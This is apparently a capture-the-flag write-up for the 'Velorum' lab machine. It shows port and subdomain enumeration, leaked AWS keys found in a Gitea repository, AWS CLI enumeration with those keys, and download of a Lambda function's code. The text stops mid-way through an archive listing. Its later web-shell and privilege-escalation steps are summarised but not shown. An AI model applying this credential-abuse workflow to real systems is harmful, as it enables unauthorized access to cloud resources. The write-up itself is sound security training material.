---
title: Velorum
categories: [HackingClub]
tags: [nmap, subdomain-enumeration, git, aws-lambda, mongodb, file-upload, binary-exploitation, suid, insane]
media_subpath: '/images/hackingclub_velorum'
image:
  path: 'https://hackingclub-statics.s3.amazonaws.com/machine/thumbnails/136520353268713be05b4843.15979200'
---

# Velorum

## Summary

**Velorum** is a Hard-rated machine that demonstrates a complex multi-stage attack chain involving subdomain enumeration, Git repository analysis, AWS Lambda exploitation, MongoDB manipulation, and binary exploitation. The initial compromise was achieved through subdomain discovery revealing a Git repository with exposed AWS credentials. After gaining access to the AWS Lambda environment, MongoDB database manipulation was used to change admin passwords and gain web application access. A file upload vulnerability allowed for web shell deployment, leading to initial system access. Finally, a SUID binary analysis revealed a command injection vulnerability that enabled privilege escalation to root.

---

## Table of Contents

1. [Initial Enumeration](#initial-enumeration)
2. [Web Application Exploration](#web-application-exploration)
3. [Git Repository Analysis](#git-repository-analysis)
4. [AWS Lambda Enumeration](#aws-lambda-enumeration)
5. [MongoDB Database Manipulation](#mongodb-database-manipulation)
6. [Web Application Access](#web-application-access)
7. [SUID Binary Analysis](#suid-binary-analysis)
8. [Privilege Escalation](#privilege-escalation)
9. [Conclusion](#conclusion)

---

## Initial Enumeration

We begin with a comprehensive Nmap scan to identify open ports and services:

```bash
sudo nmap -Pn -oN nmap -sVC -p- -T5 172.16.13.129
```

**Command Breakdown:**
- `-sV`: Service version detection
- `-sC`: Default NSE scripts
- `-Pn`: Skip host discovery (treat all hosts as online)
- `-p-`: Scan all 65535 ports
- `-T5`: Aggressive timing template
- `-oN nmap`: Output to file in normal format

**Results:**
```
22/tcp open  ssh     syn-ack OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx 1.24.0 (Ubuntu)
```

**Analysis:**
- **Port 22 (SSH)**: Standard OpenSSH service running on Ubuntu
- **Port 80 (HTTP)**: Nginx web server

**Host Configuration:**

Quick tests for enumerating possible DNS resolution:

```bash
curl -I 172.16.13.129
HTTP/1.1 301 Moved Permanently
Server: nginx/1.24.0 (Ubuntu)
Date: Fri, 17 Oct 2025 23:41:02 GMT
Content-Type: text/html
Content-Length: 178
Connection: keep-alive
Location: http://velorum.hc/
```

The server redirects to `velorum.hc`, indicating a virtual host configuration. We add this to our hosts file:

```bash
echo '172.16.13.129 velorum.hc' | sudo tee -a /etc/hosts
```

---

```
Command: ffuf -u http://velorum.hc -H 'Host: FUZZ.velorum.hc' -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -ic -c -fs 178 -mc all

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://velorum.hc
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt
 :: Header           : Host: FUZZ.velorum.hc
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 178
________________________________________________

cloud                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 2171ms]
git                     [Status: 200, Size: 13846, Words: 1099, Lines: 246, Duration: 153ms]
vault                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 169ms]
```

```bash
cat /etc/hosts | grep velorum
172.16.13.129 velorum.hc git.velorum.hc cloud.velorum.hc vault.velorum.hc
```

## Web Application Exploration

### Main Application (velorum.hc)
Entering the main site reveals a site with a sign up feature:
![Velorum Login Form](file-20251017164552687.png)

### Vault Application (vault.velorum.hc)
The vault subdomain presents a login request:
![Vault Login Request](file-20251017164622708.png)

### Git Repository (git.velorum.hc)

The Git subdomain hosts a Gitea instance:
![Gitea Instance](file-20251017165730407.png)

**Key Discovery:** We can access the vault app repository source code without authentication:
![Vault App Repository](file-20251017165740836.png)

## Git Repository Analysis

### Exposed AWS Credentials

The repository contains a `credentials.json` file with AWS credentials:

```bash
➜  vault_app git:(main) cat credentials.json
{
    "aws_access_key_id": "AKIA3F4D2QWE7ZX1GQNL",
    "aws_secret_access_key": "9dTx3i7+pA89LU7sDkEjfM/NyzRmRY+xu4HP02Gb",
    "region": "us-east-1"
}
```

### Application Architecture Analysis

Examining the `routes.js` file reveals the application architecture:

```javascript
import express from 'express'
import bcrypt from 'bcrypt'
import { openDb } from './db.js'
import fs from 'fs'
import AWS from 'aws-sdk'
import path from 'path'

const router = express.Router()

const credentialsPath = path.join(process.cwd(), 'credentials.json')
const creds = JSON.parse(fs.readFileSync(credentialsPath, 'utf8'))

const lambda = new AWS.Lambda({
  endpoint: 'http://cloud.velorum.hc',
  region: creds.region,
  accessKeyId: creds.aws_access_key_id,
  secretAccessKey: creds.aws_secret_access_key,
})
```

**Key Findings:**
- The application uses AWS Lambda with a custom endpoint (`cloud.velorum.hc`)
- AWS credentials are hardcoded in the repository
- The application appears to be a vault/secret management system

## AWS Lambda Enumeration

### Configuring AWS CLI

We configure the AWS CLI with the discovered credentials:

```bash
➜  vault_app git:(main) aws configure
AWS Access Key ID [****************GQNL]: AKIA3F4D2QWE7ZX1GQNL
AWS Secret Access Key [****************02Gb]: 9dTx3i7+pA89LU7sDkEjfM/NyzRmRY+xu4HP02Gb
Default region name [us-east-1]: us-east-1
Default output format [json]: json
```

### Testing AWS Connection

We test the connection to the custom AWS endpoint:

```bash
➜  vault_app git:(main) aws sts get-caller-identity --endpoint-url http://cloud.velorum.hc
{
    "UserId": "AKIAIOSFODNN7EXAMPLE",
    "Account": "000000000000",
    "Arn": "arn:aws:iam::000000000000:root"
}
```

**Analysis:** The connection is successful, confirming we have access to the AWS Lambda environment.

### AWS Service Enumeration

We perform a comprehensive enumeration of available AWS services:

```bash
# S3 Buckets
➜  vault_app git:(main) aws s3api list-buckets --endpoint-url http://cloud.velorum.hc
{
    "Buckets": [],
    "Owner": {
        "DisplayName": "webfile",
        "ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
    },
    "Prefix": null
}

# Lambda Functions
➜  vault_app git:(main) aws lambda list-functions --endpoint-url http://cloud.velorum.hc
{
    "Functions": []
}

# EC2 Instances (disabled)
➜  vault_app git:(main) aws ec2 describe-instances --endpoint-url http://cloud.velorum.hc
An error occurred (InternalFailure) when calling the DescribeInstances operation: Service 'ec2' is not enabled.

# Secrets Manager (disabled)
➜  vault_app git:(main) aws secretsmanager list-secrets --endpoint-url http://cloud.velorum.hc
An error occurred (InternalFailure) when calling the ListSecrets operation: Service 'secretsmanager' is not enabled.

# Systems Manager (disabled)
➜  vault_app git:(main) aws ssm describe-parameters --endpoint-url http://cloud.velorum.hc
An error occurred (InternalFailure) when calling the DescribeParameters operation: Service 'ssm' is not enabled.

# IAM (disabled)
➜  vault_app git:(main) aws iam list-users --endpoint-url http://cloud.velorum.hc
An error occurred (InternalFailure) when calling the ListUsers operation: Service 'iam' is not enabled.
```

**Analysis:**
- S3 and Lambda services are available
- EC2, Secrets Manager, Systems Manager, and IAM are disabled
- This appears to be a limited AWS environment (possibly LocalStack or similar)

### Lambda Function Discovery

From the `routes.js` analysis, we discover the application references a Lambda function called `VaultFunction`:

```javascript
router.get('/vault', requireLogin, async (req, res) => {
  try {
    const result = await lambda
      .invoke({
        FunctionName: 'VaultFunction',
        Payload: JSON.stringify({}),
      })
      .promise()

    const response = JSON.parse(result.Payload)
    const vaultData = JSON.parse(response.body)
    console.log(vaultData)

    res.render('vault', { vaultData })
  } catch (err) {
    console.error('Error invoking Lambda:', err)
    res.status(500).send('Error fetching data from Vault')
  }
})
```

**Key Findings:**
- The application invokes a `VaultFunction` Lambda function
- The function returns vault data that gets rendered in the web interface
- This suggests the Lambda function has access to sensitive vault data

### Lambda Function Enumeration

We validate the existence of the `VaultFunction` and retrieve its configuration:

```bash
➜  vault_app git:(main) ✗ aws lambda get-function \
  --function-name VaultFunction \
  --endpoint-url http://cloud.velorum.hc/
{
    "Configuration": {
        "FunctionName": "VaultFunction",
        "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:VaultFunction",
        "Runtime": "nodejs18.x",
        "Role": "arn:aws:iam::000000000000:role/lambda-execute-role",
        "Handler": "handler.handler",
        "CodeSize": 1855002,
        "Description": "",
        "Timeout": 3,
        "MemorySize": 128,
        "LastModified": "2025-10-18T00:04:34.671471+0000",
        "CodeSha256": "FTugeXGPfBKHh0l+gj6VwEgeIRrP07VSUOhJvqzPUjw=",
        "Version": "$LATEST",
        "TracingConfig": {
            "Mode": "PassThrough"
        },
        "RevisionId": "408fd354-5892-4ff6-bd3f-41d6228e2728",
        "State": "Active",
        "LastUpdateStatus": "Successful",
        "PackageType": "Zip",
        "Architectures": [
            "x86_64"
        ],
        "EphemeralStorage": {
            "Size": 512
        },
        "SnapStart": {
            "ApplyOn": "None",
            "OptimizationStatus": "Off"
        },
        "RuntimeVersionConfig": {
            "RuntimeVersionArn": "arn:aws:lambda:us-east-1::runtime:8eeff65f6809a3ce81507fe733fe09b835899b99481ba22fd75b5a7338290ec1"
        },
        "LoggingConfig": {
            "LogFormat": "Text",
            "LogGroup": "/aws/lambda/VaultFunction"
        }
    },
    "Code": {
        "RepositoryType": "S3",
        "Location": "http://s3.localhost.localstack.cloud:4566/awslambda-us-east-1-tasks/snapshots/000000000000/VaultFunction-ba069d56-c9ff-4cb5-9252-c858b12abccb?AWSAccessKeyId=949334387222&Signature=U1ddgF2s8zwrsFun%2BZUU94tCqA8%3D&Expires=1760750115"
    }
}
```

**Key Findings:**
- The function exists and is active
- It's a Node.js 18.x runtime function
- The code is stored in S3 and accessible via a signed URL
- Function size is 1.8MB, indicating substantial code

### Lambda Function Code Extraction

We download the Lambda function code using the signed URL:

```bash
➜  vault_app git:(main) ✗ curl -sS -L \
  "http://cloud.velorum.hc/awslambda-us-east-1-tasks/snapshots/000000000000/VaultFunction-ba069d56-c9ff-4cb5-9252-c858b12abccb?AWSAccessKeyId=949334387222&Signature=U1ddgF2s8zwrsFun%2BZUU94tCqA8%3D&Expires=1760750115" \
  -o VaultFunction.zip
```

We examine the contents of the downloaded archive:

```bash
➜  vault_app git:(main) ✗ 7z l VaultFunction.zip

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:12 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 1855002 bytes (1812 KiB)

Listing archive: VaultFunction.zip

--
Path = VaultFunction.zip
Type = zip
Physical Size = 1855002

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2025-06-27 15:23:23 .....          800          414  handler.js
2025-06-27 14:41:06 D....            0            0  node_modules
2025-06-27 14:41:06 D....            0            0  node_modules/sparse-bitfield
2025-06-27 14:41:06 .....         2303          758  node_modules/sparse-bitfield/index.js
2025-06-27 14:41:06 .....           69           44  node_modules/sparse-bitfield/.travis.yml
2025-06-27 14:41:06 .....          732          338  node_modules/sparse-bitfield/package.json
2025-06-27 14:41:06 .....         1079          635  node_modules/sparse-bitfield/LICENSE
2025-06-27 14:41:06 .....           13           13  node_modules/sparse-bitfield/.npmignore
2025-06-27 14:41:06 .....         1976          494  node_modules/sparse-bitfield/test.js
2025-06-27 14:41:06 .....         1773          816  node_modules/sparse-bitfield/README.md
2025-06-27 14:41:06 D....            0            0  node_modules/tr46
2025-06-27 14:41:06 .....         1076          629  node_modules/tr46/LICENSE.md
2025-06-27 14:41:06 .....         8590         2573  node_modules/tr46/index.js
2025-06-27 14:41:06 D....            0            0  node_modules/tr46/lib
2025-06-27 14:41:06 .....       141626        45680  node_modules/tr46/lib/mappingTable.json
2025-06-27 14:41:06 .....          123          110  node_modules/tr46/lib/statusMapping.js
2025-06-27 14:41:06 .....        71290        12521  node_modules/tr46/lib/regexes.js
2025-06-27 14:41:06 .....         1009          498  node_modules/tr46/package.json
2025-06-27 14:41:06 .....         2188          623  node_modules/tr46/README.md
2025-06-27 14:41:06 D....            0            0  node_modules/memory-pager
2025-06-27 14:41:06 .....         3731         1113  node_modules/memory-pager/index.js
2025-06-27 14:41:06 .....           43           35  node_modules/memory-pager/.travis.yml
2025-06-27 14:41:06 .....          595          283  node_modules/memory-pager/package.json
2025-06-27 14:41:06 .....         1079          635  node_modules/memory-pager/LICENSE
2025-06-27 14:41:06 .....         1444          325  node_modules/memory-pager/test.js
2025-06-27 14:41:06 .....         1243          632  node_modules/memory-pager/README.md
2025-06-27 14:41:05 D....            0            0  node_modules/@mongodb-js
2025-06-27 14:41:06 D....            0            0  node_modules/@mongodb-js/saslprep
2025-06-27 14:41:06 .....         2673          992  node_modules/@mongodb-js/saslprep/package.json
2025-06-27 14:41:06 .....         1060          626  node_modules/@mongodb-js/saslprep/LICENSE
2025-06-27 14:41:06 D....            0            0  node_modules/@mongodb-js/saslprep/dist
2025-06-27 14:41:06 .....          389          166  node_modules/@mongodb-js/saslprep/dist/code-points-src.d.ts
2025-06-27 14:41:06 .....          541          310  node_modules/@mongodb-js/saslprep/dist/index.d.ts
2025-06-27 14:41:06 .....         1168          479  node_modules/@mongodb-js/saslprep/dist/memory-code-points.js
2025-06-27 14:41:06 .....          244          163  node_modules/@mongodb-js/saslprep/dist/node.d.ts.map
2025-06-27 14:41:06 .....          818          336  node_modules/@mongodb-js/saslprep/dist/memory-code-points.js.map
2025-06-27 14:41:06 .....          192          138  node_modules/@mongodb-js/saslprep/dist/code-points-data-browser.d.ts.map
2025-06-27 14:41:06 .....          370          207  node_modules/@mongodb-js/saslprep/dist/browser.js.map
2025-06-27 14:41:06 .....         2997          960  node_modules/@mongodb-js/saslprep/dist/index.js
2025-06-27 14:41:06 .....         2894         1903  node_modules/@mongodb-js/saslprep/dist/code-points-data.js
2025-06-27 14:41:06 .....          214          152  node_modules/@mongodb-js/saslprep/dist/memory-code-points.d.ts.map
2025-06-27 14:41:06 .....          402          198  node_modules/@mongodb-js/saslprep/dist/util.js.map
2025-06-27 14:41:06 .....         2988          801  node_modules/@mongodb-js/saslprep/dist/index.js.map
2025-06-27 14:41:06 .....          161          125  node_modules/@mongodb-js/saslprep/dist/browser.d.ts.map
2025-06-27 14:41:06 .....          651          302  node_modules/@mongodb-js/saslprep/dist/node.js
2025-06-27 14:41:06 .....          162          134  node_modules/@mongodb-js/saslprep/dist/browser.d.ts
2025-06-27 14:41:06 .....          294          181  node_modules/@mongodb-js/saslprep/dist/node.d.ts
2025-06-27 14:41:06 .....          120          105  node_modules/@mongodb-js/saslprep/dist/code-points-data.d.ts
2025-06-27 14:41:06 .....          101           90  node_modules/@mongodb-js/saslprep/dist/util.d.ts
2025-06-27 14:41:06 .....         3984         1391  node_modules/@mongodb-js/saslprep/dist/generate-code-points.js
2025-06-27 14:41:06 .....          302          215  node_modules/@mongodb-js/saslprep/dist/util.js
2025-06-27 14:41:06 .....          116          103  node_modules/@mongodb-js/saslprep/dist/code-points-data-browser.d.ts
2025-06-27 14:41:06 .....          222          158  node_modules/@mongodb-js/saslprep/dist/code-points-data.js.map
2025-06-27 14:41:06 .....          414          238  node_modules/@mongodb-js/saslprep/dist/index.d.ts.map
2025-06-27 14:41:06 .....         2239          660  node_modules/@mongodb-js/saslprep/dist/generate-code-points.js.map
2025-06-27 14:41:06 .....          481          230  node_modules/@mongodb-js/saslprep/dist/memory-code-points.d.ts
2025-06-27 14:41:06 .....          134           97  node_modules/@mongodb-js/saslprep/dist/generate-code-points.d.ts.map
2025-06-27 14:41:06 .....          323          170  node_modules/@mongodb-js/saslprep/dist/code-points-src.d.ts.map
2025-06-27 14:41:06 .....          240          161  node_modules/@mongodb-js/saslprep/dist/code-points-data-browser.js.map
2025-06-27 14:41:06 .....          641          313  node_modules/@mongodb-js/saslprep/dist/browser.js
2025-06-27 14:41:06 .....          137          108  node_modules/@mongodb-js/saslprep/dist/code-points-data.d.ts.map
2025-06-27 14:41:06 .....       560013         2569  node_modules/@mongodb-js/saslprep/dist/code-points-data-browser.js
2025-06-27 14:41:06 .....        30475          767  node_modules/@mongodb-js/saslprep/dist/code-points-src.js.map
2025-06-27 14:41:06 .....           61           61  node_modules/@mongodb-js/saslprep/dist/generate-code-points.d.ts
2025-06-27 14:41:06 .....           88           69  node_modules/@mongodb-js/saslprep/dist/.esm-wrapper.mjs
2025-06-27 14:41:06 .....        29006         4981  node_modules/@mongodb-js/saslprep/dist/code-points-src.js
2025-06-27 14:41:06 .....          397          224  node_modules/@mongodb-js/saslprep/dist/node.js.map
2025-06-27 14:41:06 .....          179          130  node_modules/@mongodb-js/saslprep/dist/util.d.ts.map
2025-06-27 14:41:06 .....          735          440  node_modules/@mongodb-js/saslprep/readme.md
2025-06-27 14:41:05 D....            0            0  node_modules/@types
2025-06-27 14:41:06 D....            0            0  node_modules/@types/webidl-conversions
2025-06-27 14:41:06 .....         4076          759  node_modules/@types/webidl-conversions/index.d.ts
2025-06-27 14:41:06 .....          985          386  node_modules/@types/webidl-conversions/package.json
2025-06-27 14:41:06 .....         1141          637  node_modules/@types/webidl-conversions/LICENSE
2025-06-27 14:41:06 .....          565          311  node_modules/@types/webidl-conversions/README.md
2025-06-27 14:41:06 D....            0            0  node_modules/@types/whatwg-url
2025-06-27 14:41:06 .....         4892         1229  node_modules/@types/whatwg-url/index.d.ts
2025-06-27 14:41:06 D....            0            0  node_modules/@types/whatwg-url/lib
2025-06-27 14:41:06 .....          706          309  node_modules/@types/whatwg-url/lib/URLSearchParams-impl.d.ts
2025-06-27 14:41:06 .....         2240          703  node_modules/@types/whatwg-url/lib/URL.d.ts
2025-06-27 14:41:06 .....          590          266  node_modules/@types/whatwg-url/lib/URL-impl.d.ts
2025-06-27 14:41:06 .....         3357          871  node_modules/@types/whatwg-url/lib/URLSearchParams.d.ts
2025-06-27 14:41:06 .....          126           70  node_modules/@types/whatwg-url/webidl2js-wrapper.d.ts
2025-06-27 14:41:06 .....         1149          428  node_modules/@types/whatwg-url/package.json
2025-06-27 14:41:06 .....         1141          637  node_modules/@types/whatwg-url/LICENSE
2025-06-27 14:41:06 .....          656          354  node_modules/@types/whatwg-url/README.md
2025-06-27 14:41:06 D....            0            0  node_modules/webidl-conversions
2025-06-27 14:41:06 .....         1323          689  node_modules/webidl-conversions/LICENSE.md
2025-06-27 14:41:06 D....            0            0  node_modules/webidl-conversions/lib
2025-06-27 14:41:06 .....        12725         3074  node_modules/webidl-conversions/lib/index.js
2025-06-27 14:41:06 .....          982          510  node_modules/webidl-conversions/package.json
2025-06-27 14:41:06 .....         9212         3387  node_modules/webidl-conversions/README.md
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb
2025-06-27 14:41:06 .....        11323         3943  node_modules/mongodb/LICENSE.md
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/src
2025-06-27 14:41:06 .....        42339         7215  node_modules/mongodb/src/error.ts
2025-06-27 14:41:06 .....         2536          947  node_modules/mongodb/src/resource_management.ts
2025-06-27 14:41:06 .....        40775         9798  node_modules/mongodb/src/connection_string.ts
2025-06-27 14:41:06 .....         4678         1634  node_modules/mongodb/src/bson.ts
2025-06-27 14:41:06 .....         4360         1297  node_modules/mongodb/src/encrypter.ts
2025-06-27 14:41:06 .....        18617         4458  node_modules/mongodb/src/index.ts
2025-06-27 14:41:06 .....         5958         1622  node_modules/mongodb/src/write_concern.ts
2025-06-27 14:41:06 .....        40047         9701  node_modules/mongodb/src/sessions.ts
2025-06-27 14:41:06 .....        43867        13398  node_modules/mongodb/src/utils.ts
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/src/operations
2025-06-27 14:41:06 .....         2101          769  node_modules/mongodb/src/operations/count.ts
2025-06-27 14:41:06 .....         1993          813  node_modules/mongodb/src/operations/kill_cursors.ts
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/src/operations/client_bulk_write
2025-06-27 14:41:06 .....         8365         2053  node_modules/mongodb/src/operations/client_bulk_write/results_merger.ts
2025-06-27 14:41:06 .....         5982         1728  node_modules/mongodb/src/operations/client_bulk_write/executor.ts
2025-06-27 14:41:06 .....        15185         3622  node_modules/mongodb/src/operations/client_bulk_write/command_builder.ts
2025-06-27 14:41:06 .....         8782         2129  node_modules/mongodb/src/operations/client_bulk_write/common.ts
2025-06-27 14:41:06 .....         4032         1317  node_modules/mongodb/src/operations/client_bulk_write/client_bulk_write.ts
2025-06-27 14:41:06 .....         1894          760  node_modules/mongodb/src/operations/estimated_document_count.ts
2025-06-27 14:41:06 .....         1208          487  node_modules/mongodb/src/operations/options_operation.ts
2025-06-27 14:41:06 .....        10461         3146  node_modules/mongodb/src/operations/execute_operation.ts
2025-06-27 14:41:06 .....         1177          491  node_modules/mongodb/src/operations/is_capped.ts
2025-06-27 14:41:06 .....         2193          808  node_modules/mongodb/src/operations/validate_collection.ts
2025-06-27 14:41:06 .....         1308          523  node_modules/mongodb/src/operations/profiling_level.ts
2025-06-27 14:41:06 .....         3815         1149  node_modules/mongodb/src/operations/drop.ts
2025-06-27 14:41:06 .....         4402         1563  node_modules/mongodb/src/operations/operation.ts
2025-06-27 14:41:06 .....         2563          804  node_modules/mongodb/src/operations/run_command.ts
2025-06-27 14:41:06 .....         9453         3054  node_modules/mongodb/src/operations/find.ts
2025-06-27 14:41:06 .....         5864         1711  node_modules/mongodb/src/operations/delete.ts
2025-06-27 14:41:06 .....         3771         1399  node_modules/mongodb/src/operations/list_collections.ts
2025-06-27 14:41:06 .....        13271         4029  node_modules/mongodb/src/operations/indexes.ts
2025-06-27 14:41:06 .....        10933         2503  node_modules/mongodb/src/operations/update.ts
2025-06-27 14:41:06 .....         1965          721  node_modules/mongodb/src/operations/set_profiling_level.ts
2025-06-27 14:41:06 .....         9961         2413  node_modules/mongodb/src/operations/find_and_modify.ts
2025-06-27 14:41:06 .....         1225          499  node_modules/mongodb/src/operations/stats.ts
2025-06-27 14:41:06 .....         1078          441  node_modules/mongodb/src/operations/remove_user.ts
2025-06-27 14:41:06 .....         5857         1739  node_modules/mongodb/src/operations/insert.ts
2025-06-27 14:41:06 .....         1783          660  node_modules/mongodb/src/operations/bulk_write.ts
2025-06-27 14:41:06 .....         1345          559  node_modules/mongodb/src/operations/collections.ts
2025-06-27 14:41:06 .....         7629         2594  node_modules/mongodb/src/operations/create_collection.ts
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/src/operations/search_indexes
2025-06-27 14:41:06 .....         1475          587  node_modules/mongodb/src/operations/search_indexes/create.ts
2025-06-27 14:41:06 .....         1340          546  node_modules/mongodb/src/operations/search_indexes/drop.ts
2025-06-27 14:41:06 .....         1053          427  node_modules/mongodb/src/operations/search_indexes/update.ts
2025-06-27 14:41:06 .....         1795          683  node_modules/mongodb/src/operations/rename.ts
2025-06-27 14:41:06 .....         5819         2089  node_modules/mongodb/src/operations/aggregate.ts
2025-06-27 14:41:06 .....         3396         1254  node_modules/mongodb/src/operations/distinct.ts
2025-06-27 14:41:06 .....         3604         1415  node_modules/mongodb/src/operations/get_more.ts
2025-06-27 14:41:06 .....         5720         1822  node_modules/mongodb/src/operations/command.ts
2025-06-27 14:41:06 .....         2550          982  node_modules/mongodb/src/operations/list_databases.ts
2025-06-27 14:41:06 .....        36174         7893  node_modules/mongodb/src/change_stream.ts
2025-06-27 14:41:06 .....         8871         2266  node_modules/mongodb/src/read_preference.ts
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/src/cmap
2025-06-27 14:41:06 .....        26386         6380  node_modules/mongodb/src/cmap/connection_pool.ts
2025-06-27 14:41:06 .....         8138         1496  node_modules/mongodb/src/cmap/connection_pool_events.ts
2025-06-27 14:41:06 .....         1574          487  node_modules/mongodb/src/cmap/metrics.ts
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/src/cmap/auth
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/src/cmap/auth/mongodb_oidc
2025-06-27 14:41:06 .....         2581         1052  node_modules/mongodb/src/cmap/auth/mongodb_oidc/azure_machine_workflow.ts
2025-06-27 14:41:06 .....         5518         1558  node_modules/mongodb/src/cmap/auth/mongodb_oidc/human_callback_workflow.ts
2025-06-27 14:41:06 .....         1474          446  node_modules/mongodb/src/cmap/auth/mongodb_oidc/token_cache.ts
2025-06-27 14:41:06 .....          759          400  node_modules/mongodb/src/cmap/auth/mongodb_oidc/token_machine_workflow.ts
2025-06-27 14:41:06 .....         3047         1068  node_modules/mongodb/src/cmap/auth/mongodb_oidc/automated_callback_workflow.ts
2025-06-27 14:41:06 .....         1608          618  node_modules/mongodb/src/cmap/auth/mongodb_oidc/command_builders.ts
2025-06-27 14:41:06 .....         6479         2104  node_modules/mongodb/src/cmap/auth/mongodb_oidc/callback_workflow.ts
2025-06-27 14:41:06 .....         1015          476  node_modules/mongodb/src/cmap/auth/mongodb_oidc/k8s_machine_workflow.ts
2025-06-27 14:41:06 .....         1573          730  node_modules/mongodb/src/cmap/auth/mongodb_oidc/gcp_machine_workflow.ts
2025-06-27 14:41:06 .....          805          395  node_modules/mongodb/src/cmap/auth/plain.ts
2025-06-27 14:41:06 .....         1463          508  node_modules/mongodb/src/cmap/auth/x509.ts
2025-06-27 14:41:06 .....          663          281  node_modules/mongodb/src/cmap/auth/providers.ts
2025-06-27 14:41:06 .....         2144          744  node_modules/mongodb/src/cmap/auth/auth_provider.ts
2025-06-27 14:41:06 .....        10531         2862  node_modules/mongodb/src/cmap/auth/mongo_credentials.ts
2025-06-27 14:41:06 .....         6040         1941  node_modules/mongodb/src/cmap/auth/gssapi.ts
2025-06-27 14:41:06 .....         6243         2097  node_modules/mongodb/src/cmap/auth/mongodb_aws.ts
2025-06-27 14:41:06 .....         6341         1946  node_modules/mongodb/src/cmap/auth/mongodb_oidc.ts
2025-06-27 14:41:06 .....         6447         2237  node_modules/mongodb/src/cmap/auth/aws_temporary_credentials.ts
2025-06-27 14:41:06 .....         9714         2967  node_modules/mongodb/src/cmap/auth/scram.ts
2025-06-27 14:41:06 .....        24012         5716  node_modules/mongodb/src/cmap/commands.ts
2025-06-27 14:41:06 .....         3315          769  node_modules/mongodb/src/cmap/errors.ts
2025-06-27 14:41:06 .....         8804         2209  node_modules/mongodb/src/cmap/command_monitoring_events.ts
2025-06-27 14:41:06 .....        30357         8184  node_modules/mongodb/src/cmap/connection.ts
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/src/cmap/wire_protocol
2025-06-27 14:41:06 .....        12202         3583  node_modules/mongodb/src/cmap/wire_protocol/responses.ts
2025-06-27 14:41:06 .....         1807          606  node_modules/mongodb/src/cmap/wire_protocol/shared.ts
2025-06-27 14:41:06 .....         5689         1798  node_modules/mongodb/src/cmap/wire_protocol/compression.ts
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/src/cmap/wire_protocol/on_demand
2025-06-27 14:41:06 .....        11439         3364  node_modules/mongodb/src/cmap/wire_protocol/on_demand/document.ts
2025-06-27 14:41:06 .....         3991         1415  node_modules/mongodb/src/cmap/wire_protocol/on_data.ts
2025-06-27 14:41:06 .....          509          170  node_modules/mongodb/src/cmap/wire_protocol/constants.ts
2025-06-27 14:41:06 .....         2902          981  node_modules/mongodb/src/cmap/stream_description.ts
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/src/cmap/handshake
2025-06-27 14:41:06 .....         9622         3112  node_modules/mongodb/src/cmap/handshake/client_metadata.ts
2025-06-27 14:41:06 .....        15561         4521  node_modules/mongodb/src/cmap/connect.ts
2025-06-27 14:41:06 .....        12548         3028  node_modules/mongodb/src/timeout.ts
2025-06-27 14:41:06 .....        21862         5731  node_modules/mongodb/src/db.ts
2025-06-27 14:41:06 .....         5579         1593  node_modules/mongodb/src/transactions.ts
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/src/bulk
2025-06-27 14:41:06 .....         3052         1077  node_modules/mongodb/src/bulk/ordered.ts
2025-06-27 14:41:06 .....         3961         1246  node_modules/mongodb/src/bulk/unordered.ts
2025-06-27 14:41:06 .....        39067         8628  node_modules/mongodb/src/bulk/common.ts
2025-06-27 14:41:06 .....         3652         1137  node_modules/mongodb/src/mongo_client_auth_providers.ts
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/src/client-side-encryption
2025-06-27 14:41:06 .....         3766         1496  node_modules/mongodb/src/client-side-encryption/mongocryptd_manager.ts
2025-06-27 14:41:06 .....        17425         4939  node_modules/mongodb/src/client-side-encryption/auto_encrypter.ts
2025-06-27 14:41:06 .....        34565         7828  node_modules/mongodb/src/client-side-encryption/client_encryption.ts
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/src/client-side-encryption/providers
2025-06-27 14:41:06 .....         5869         1808  node_modules/mongodb/src/client-side-encryption/providers/index.ts
2025-06-27 14:41:06 .....         5051         1743  node_modules/mongodb/src/client-side-encryption/providers/azure.ts
2025-06-27 14:41:06 .....          508          284  node_modules/mongodb/src/client-side-encryption/providers/gcp.ts
2025-06-27 14:41:06 .....         1131          544  node_modules/mongodb/src/client-side-encryption/providers/aws.ts
2025-06-27 14:41:06 .....         3886          777  node_modules/mongodb/src/client-side-encryption/errors.ts
2025-06-27 14:41:06 .....         2512          741  node_modules/mongodb/src/client-side-encryption/crypto_callbacks.ts
2025-06-27 14:41:06 .....        21463         5948  node_modules/mongodb/src/client-side-encryption/state_machine.ts
2025-06-27 14:41:06 .....        22310         5633  node_modules/mongodb/src/mongo_types.ts
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/src/gridfs
2025-06-27 14:41:06 .....         8699         2476  node_modules/mongodb/src/gridfs/index.ts
